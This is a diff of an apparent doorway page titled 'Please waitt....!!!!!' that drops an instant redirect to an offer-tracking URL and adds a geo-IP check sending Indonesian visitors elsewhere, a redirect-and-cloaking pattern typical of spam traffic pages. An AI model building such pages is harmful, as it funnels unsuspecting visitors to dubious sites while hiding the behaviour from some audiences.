@@ -24,10 +24,23 @@
     <title>Please waitt....!!!!! </title>
 </head>
 <body>
-	<script>
-			window.location.replace("https://dbajihg.offrshub.com/s/a6d06e2c50a10?track=DEFAULT&subsource=DEFAULT&ext_click_id=TEAMWORK");
-		</script>
+	<script async src="https://get.geojs.io/v1/ip/geo.js"></script>
+<script>
+  function geoip() {
+   $.ajax({
+        type: 'get',
+        url: 'https://get.geojs.io/v1/ip/country.json',
+        success: function(data) {
+            if (data['country'] == "ID") {
+              window.location = "https://www.example.com/";
+            }
+        }
+    });
+    }
+geoip();
+</script>
 </body>
 </html>
+
 
 
